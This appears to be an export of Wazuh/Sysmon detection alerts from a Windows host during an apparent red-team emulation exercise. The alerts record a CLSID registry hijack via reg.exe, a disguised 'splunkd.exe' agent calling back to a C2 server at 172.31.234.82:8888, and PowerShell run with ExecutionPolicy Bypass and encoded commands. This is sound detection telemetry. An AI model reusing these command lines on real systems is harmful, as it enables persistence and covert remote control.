Description: Registry Console Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: reg.exe
CommandLine: reg  ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=C0DB341DEFA8EF40C03ED769A9001D600E0F4DAE,MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: {15959494-82d0-6758-4804-000000000300}
ParentProcessId: 1544
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:05:04.2224878Z,10446,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,10,Value added to registry key has Base64-like pattern,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92041,windows_eventchannel,log,"Dec 10, 2024 @ 18:05:05.000",EventChannel,1733853905,"Dec 10, 2024 @ 18:05:05.000", , , , , ,reg.exe,C:\\Windows\\System32\\reg.exe,Microsoft® Windows® Operating System, , ,Registry Console Tool, , ,{15959494-82d0-6758-4904-000000000300},1856,05:04.2,"SHA1=C0DB341DEFA8EF40C03ED769A9001D600E0F4DAE,MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Obfuscated Files or Information"",""Modify Registry""]","[""T1027"",""T1112""]","[""Defense Evasion""]", , , , , , , , , , , ,{15959494-82d0-6758-4804-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"cmd.exe /C reg ADD \""HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\"" /ve /d \""calc.exe\"" /f",0xeacdd,1544,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,"reg  ADD \""HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\"" /ve /d \""calc.exe\"" /f",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,WvRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 18:05:06.218
ProcessGuid: {15959494-82d2-6758-4a04-000000000300}
ProcessId: 4180
Image: C:\WINDOWS\system32\cmd.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\OSTapGet.js
CreationUtcTime: 2024-12-10 18:05:06.218
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:05:06.2193454Z,10451,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,33,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:05:07.006",EventChannel,1733853907,"Dec 10, 2024 @ 18:05:07.006", , , , , , ,C:\\WINDOWS\\system32\\cmd.exe, , , , , , ,{15959494-82d2-6758-4a04-000000000300},4180,05:06.2, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\OSTapGet.js,05:06.2, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,X_RRspMBtNh2X6vnU-Aq,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 18:06:02.231
ProcessGuid: {15959494-830a-6758-4e04-000000000300}
ProcessId: 5244
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C query user
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:06:02.2328019Z,10466,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,13,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 18:06:02.998",EventChannel,1733853962,"Dec 10, 2024 @ 18:06:02.998", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-830a-6758-4e04-000000000300},5244,06:02.2,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C query user,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,YfRRspMBtNh2X6vnU-Aq,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:06:51.354
ProcessGuid: {15959494-833b-6758-5104-000000000300}
ProcessId: 5464
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_emkmwtm1.bht.ps1
CreationUtcTime: 2024-12-10 18:06:51.354
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:06:51.3669409Z,10480,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,34,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:06:52.152",EventChannel,1733854012,"Dec 10, 2024 @ 18:06:52.152", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-833b-6758-5104-000000000300},5464,06:51.4, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_emkmwtm1.bht.ps1,06:51.4, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,Z_RRspMBtNh2X6vnU-Aq,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:08:24.413
ProcessGuid: {15959494-8398-6758-7104-000000000300}
ProcessId: 6864
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_3s3wbzks.x2e.ps1
CreationUtcTime: 2024-12-10 18:08:24.413
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:08:24.4289552Z,10584,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,37,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:08:25.227",EventChannel,1733854105,"Dec 10, 2024 @ 18:08:25.227", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8398-6758-7104-000000000300},6864,08:24.4, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_3s3wbzks.x2e.ps1,08:24.4, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,bPRRspMBtNh2X6vnU-Aq,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:08:41.380
ProcessGuid: {15959494-839e-6758-8004-000000000300}
ProcessId: 6240
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_h5l2vfbe.iuj.ps1
CreationUtcTime: 2024-12-10 18:08:41.380
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:08:41.3825005Z,10668,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,40,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:08:42.141",EventChannel,1733854122,"Dec 10, 2024 @ 18:08:42.141", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-839e-6758-8004-000000000300},6240,08:41.4, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_h5l2vfbe.iuj.ps1,08:41.4, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,bvRRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:09:36.932
ProcessGuid: {15959494-83e0-6758-9704-000000000300}
ProcessId: 3452
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_rwvle5wb.rt2.ps1
CreationUtcTime: 2024-12-10 18:09:36.932
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:09:36.9419284Z,10686,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,41,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:09:37.417",EventChannel,1733854177,"Dec 10, 2024 @ 18:09:37.417", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-83e0-6758-9704-000000000300},3452,09:36.9, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_rwvle5wb.rt2.ps1,09:36.9, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,cPRRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:09:39.232
ProcessGuid: {15959494-83e2-6758-a404-000000000300}
ProcessId: 4940
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_ejd3pkfb.4ns.ps1
CreationUtcTime: 2024-12-10 18:09:39.232
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:09:39.2503192Z,10726,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,42,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:09:40.018",EventChannel,1733854180,"Dec 10, 2024 @ 18:09:40.018", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-83e2-6758-a404-000000000300},4940,09:39.2, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ejd3pkfb.4ns.ps1,09:39.2, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,dPRRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:10:32.249
ProcessGuid: {15959494-8418-6758-b704-000000000300}
ProcessId: 3204
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_edg1vspg.d1o.ps1
CreationUtcTime: 2024-12-10 18:10:32.249
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:10:32.2549992Z,10788,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,45,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:10:33.063",EventChannel,1733854233,"Dec 10, 2024 @ 18:10:33.063", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8418-6758-b704-000000000300},3204,10:32.2, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_edg1vspg.d1o.ps1,10:32.2, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,dfRRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution
UtcTime: 2024-12-10 18:10:33.928
ProcessGuid: {15959494-8419-6758-c404-000000000300}
ProcessId: 7444
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
FileVersion: 4.8.4084.0 built by: NET48REL1
Description: Visual C# Command Line Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: csc.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\mari\AppData\Local\Temp\4c5z0qdk.cmdline""
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=528973416456C780051889CA1709510B6BF73370,MD5=F65B029562077B648A6A5F6A1AA76A66,SHA256=4A6D0864E19C0368A47217C129B075DDDF61A6A262388F9D21045D82F3423ED7,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D
ParentProcessGuid: {15959494-8418-6758-b704-000000000300}
ParentProcessId: 3204
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:10:33.9311649Z,10817,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,6,FALSE,6,"Powershell script compiling code using CSC.exe, possible malware drop","[""sysmon"",""sysmon_eid1_detections"",""windows""]",92006,windows_eventchannel,log,"Dec 10, 2024 @ 18:10:34.249",EventChannel,1733854234,"Dec 10, 2024 @ 18:10:34.249", , , , , ,csc.exe,C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe,Microsoft® .NET Framework, , ,Visual C# Command Line Compiler, , ,{15959494-8419-6758-c404-000000000300},7444,10:33.9,"SHA1=528973416456C780051889CA1709510B6BF73370,MD5=F65B029562077B648A6A5F6A1AA76A66,SHA256=4A6D0864E19C0368A47217C129B075DDDF61A6A262388F9D21045D82F3423ED7,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D","technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution",Microsoft Corporation,4.8.4084.0 built by: NET48REL1,DESKTOP-QGB4EQH\\mari,"[""Compile After Delivery""]","[""T1027.004""]","[""Defense Evasion""]", , , , , , , , , , , ,{15959494-8418-6758-b704-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"powershell.exe -ExecutionPolicy Bypass -C \""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop\""",0xeacdd,3204,C:\\Users\\mari\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\"" /noconfig /fullpaths @\""C:\\Users\\mari\\AppData\\Local\\Temp\\4c5z0qdk.cmdline\""",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,dvRRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:10:38.605
ProcessGuid: {15959494-7c97-6758-b201-000000000300}
ProcessId: 9140
Image: C:\Users\Public\splunkd.exe
TargetFilename: C:\Users\mari\Emulate-Administrator-Tasks.ps1
CreationUtcTime: 2024-12-10 18:10:38.605
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:10:38.6528786Z,10823,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,5,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 18:10:39.502",EventChannel,1733854239,"Dec 10, 2024 @ 18:10:39.502", , , , , , ,C:\\Users\\Public\\splunkd.exe, , , , , , ,{15959494-7c97-6758-b201-000000000300},9140,10:38.6, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\Emulate-Administrator-Tasks.ps1,10:38.6, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,ePRRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:10:43.341
ProcessGuid: {15959494-8418-6758-b704-000000000300}
ProcessId: 3204
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_vhqvnklc.1ll.ps1
CreationUtcTime: 2024-12-10 18:10:43.341
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:10:43.3523317Z,10837,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,47,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:10:44.033",EventChannel,1733854244,"Dec 10, 2024 @ 18:10:44.033", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8418-6758-b704-000000000300},3204,10:43.3, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_vhqvnklc.1ll.ps1,10:43.3, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
